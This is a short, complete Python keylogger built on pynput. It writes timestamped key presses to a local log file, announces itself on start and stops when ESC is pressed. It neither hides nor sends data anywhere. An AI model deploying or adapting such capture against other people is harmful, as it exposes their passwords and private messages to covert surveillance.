#!/usr/bin/env python3
from pynput import keyboard
import datetime
import os

# Global variables
log_file = "keystrokes.log"
current_keys = set()

def get_timestamp():
    """Return current timestamp for logging"""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    """Callback function for key press events"""
    try:
        # Add key to current pressed keys set
        current_keys.add(key)
        
        # Log the key press
        with open(log_file, "a") as f:
            timestamp = get_timestamp()
            key_char = key.char if hasattr(key, 'char') else str(key)
            f.write(f"[{timestamp}] Pressed: {key_char}\n")
            
    except Exception as e:
        print(f"Error logging key press: {e}")

def on_release(key):
    """Callback function for key release events"""
    try:
        # Remove key from current pressed keys
        if key in current_keys:
            current_keys.remove(key)
            
        # Special case: Stop listener when ESC is pressed
        if key == keyboard.Key.esc:
            print("ESC pressed, stopping keylogger...")
            return False
            
    except Exception as e:
        print(f"Error handling key release: {e}")

def main():
    """Main function to start the keylogger"""
    print("Starting keylogger...")
    print("Press ESC to stop the keylogger")
    print(f"Logging to: {os.path.abspath(log_file)}")
    
    # Create or clear the log file
    with open(log_file, "w") as f:
        f.write(f"Keylogger started at: {get_timestamp()}\n")
        f.write("=" * 50 + "\n")
    
    # Set up the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
